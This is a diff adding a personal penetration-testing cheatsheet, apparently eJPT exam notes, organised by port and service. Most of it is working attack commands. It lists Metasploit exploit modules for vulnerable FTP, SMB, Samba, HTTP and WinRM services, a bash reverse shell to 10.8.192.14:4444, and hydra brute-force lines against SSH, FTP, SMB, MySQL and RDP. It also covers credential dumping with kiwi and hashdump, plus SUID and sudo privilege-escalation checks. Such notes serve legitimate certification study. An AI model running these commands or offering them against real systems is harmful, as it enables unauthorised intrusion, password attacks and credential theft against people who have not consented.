@@ -1,0 +1,244 @@
+Cheatsheet   control +SHIFT+ ALT to open clickboard 
+
+https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet
+https://www.linkedin.com/pulse/ejpt-journey-my-experience-m-noman-khalid-muhammad-noman-khalid/
+
+tmux    
+ #To open multiple terminal sessions use  HOLD Control + B  then release both and type c
+
+nc 192.168.1.3 512            # use this command to grab the banner of the service 
+
+cat /etc/*release               # linux post exploitation command to get operating system info 
+
+...........................................................................................
+
+PORT 21 PROFTPD 1.3.3c
+
+exploit/unix/ftp/proftpd_133c_backdoor      #RCE 
+
+See if we can use PUT command to gain reverseshell after anonymous FTP login 
+
+put this reverse shell on ftp server         nc -nvlp 8080
+#!/bin/bash
+bash -i >& /dev/tcp/10.8.192.14/4444 0>&1
+
+..........................................................................................
+SSH 22...
+
+ssh harjot@192.168.1.2      # command to connect to ssh
+
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.26.161 ssh                    
+if you know the username then replace -L with small -l and then put the username and only bruteforce for passsword 
+eg -l administrator 
+
+............................................................................................................................
+
+HttpFileServer port 80
+
+use exploit/windows/http/rejetto_hfs_exec        #RCE
+
+
+Badblue 2.72 Port 80 
+
+use exploit/windows/http/badblue_passthru   #RCE
+..............................................................................
+
+SMB 445
+
+Bruteforce username and password and login with the following module for reverse shell 
+hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.31.252 smb
+
+Use the following module when you have username and password
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_tcp
+
+check for SMB eternalblue attack 
+
+...........................................................................................................................................................................................
+
+MySQL 3306 v5.5
+
+nmap -sV -sC 192.168.1.1 -p 3306
+
+searchsploit MySQL 5.5
+
+for bruteforce credentials
+use auxiliary/scanner/mysql/mysql_login
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+
+To login into mysql
+mysql -u root -p -h 10.0.25.212
+
+
+.................................................................................................................
+
+VsFTPd 2.3.4 Linux    PORT 21
+
+check for anonymous FTP
+
+if not then bruteforce it 
+hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.2.17.5 ftp
+
+
+..................................................................................................................................................
+
+PHP  > 5.3.1 is vulnerable to CGI Argument injection
+
+phpinfo.php
+use exploit/multi/http/php_cgi_arg_injection             #RCE
+
+...........................................................................................................................................................................
+
+SMB / SAMBA 445
+
+exploit/multi/samba/usermap_script    #RCE
+
+exploit/linux/samba/is_known_pipename  #RCE     samba 3x - 4x
+
+...................................................................................................................
+
+ WINDOWS remote management  5985
+
+exploit/windows/winrm/winrm_script_exec        # RCE but need credentials 
+set FORCE_VBS true
+
+
+..............................................................................................................................
+
+POST EXPLOITATION METASPLOIT
+
+use post/windows/gather/enum_logged_on_users                 # To see logged in users 
+
+getuid
+
+getprivs
+
+ #shell command  WINDOWS
+search flag dir /b/s *flag.txt  
+whoami /priv          
+query user                 # use it to see if anyother user is currently logged in 
+net users     # list all the users
+net user administrator     # Detailed info about the user 
+net localgroup        # to list all the groups 
+net localgroup administrators
+ipconfig /all
+arp -a    # to see other connected devices
+netstat -ano  # print open ports used by services running on the system
+
+
+#Shell Command Linux
+hostname 
+cat /etc/issue        #Linux distro name
+cat /etc/*release  # more detailed info about the above command 
+uname -r               #Linux kernel info 
+env                         #environment variable for root user 
+dpkg -l                    # to list all the installed packages which can be used later during priv escalation 
+groups root           # To enumerate the groups which the root user is a part of 
+groups                    # To list all the groups on the system
+who                         # Use this command to see the currently logged in user 
+lastlog                     # to get a list of users who logged in recently
+netstat                    # meterpreter command to list open ports with connection details
+route                       # meterpreter command to see all available routes
+ip a s                        # To list all network interfaces
+cat /etc/networks # to list network interfaces and their subnets
+cat /etc/hosts        #To list all hosts
+cat /etc/resolv.conf         # To identify default DNS name server
+ls -al /etc/cron*                 # To get a list of cron jobs running 
+cat /etc/shells                    # To see which shells are available on linux 
+sudo -l                                  # A command a current user can run           #Linux privs
+
+
+
+Meterpreter 
+ps                                       # to list running process
+pgrep vsftpd                    # To get the PID of specific service 
+ps vsftpd                           # Same as above command but more info about PATH, Owner detail etc
+
+
+.....................................................................................................................
+#LOOT https://dnschecker.org/netmask-cidr.php    NETMASK TO CDIR FINDER
+Bruteforce
+
+SMB bruteforce wordlist
+
+/usr/share/metasploit-framework/data/wordlists/common_users.txt
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+ /usr/share/wordlists/metasploit/unix_passwords.txt
+/usr/share/wordlists/rockyou.txt
+
+See Assessment methodology for hydra command and metasploit module to bruteforce SMB
+
+
+######################################################################################
+
+
+
+FTP BRUTEFORCE WORDLISTS
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.117.182.3 ftp
+
+
+
+
+########################################################################################
+
+SSH BRUTEFORCE WORDLISTS
+
+ hydra -l student -P /usr/share/wordlists/rockyou.txt 192.85.125.3 ssh
+
+-L to use username list also
+
+#Nmap command for bruteforce list 
+nmap 192.85.125.3 -p 22 --script ssh-brute --script-args userdb=/root/users.txt
+USE METASPLOIT MODULE, see Assessment methodology
+
+########################################################################################
+
+MYSQL BRUTEFORCE 
+
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.11.232.1 mysql
+
+
+#########################################################################################
+
+RDP BRUTEFORCE 
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333
+
+.................................................................................................................................................................................................
+Methodology
+1.. Nmap PortScan       
+2..  Get ACCESS using vulnerability
+3..  use this  exploit suggester to esclate our privs
+post/multi/recon/local_exploit_suggester
+4.. use kiwi . help command to get all kiwi commands and dump all the creds
+hashdump  command to retrieve hash for crack
+5.. Crack hashes  see Host and Network Post Exploitation module 
+
+
+
+..................................................................................................................................................................................................
+
+Linux Priv Esclation Technique
+https://gtfobins.github.io/gtfobins/less/        ##Search any binary ( sudo -l ) for Privs esclation
+https://0xsanz.medium.com/linux-privesc-tryhackme-a41eddc5b595
+ls -al /etc/cron*
+
+method 1... 
+
+Finding SUID Binaries
+
+We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: "find / -perm -u=s -type f 2>/dev/null" to search the file system for SUID/GUID files. Let's break down this command.
+find - Initiates the "find" command
+/ - Searches the whole file system
+-perm - searches for files with specific permissions
+-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
+-type f - Only search for files
+2>/dev/null - Suppresses errors
+
+
+All other meathods:    https://medium.com/@JAlblas/tryhackme-common-linux-privesc-walkthrough-296e8babe42f
+
+#LOOT  use this website to identify the hash type then decode it https://md5hashing.net/
+
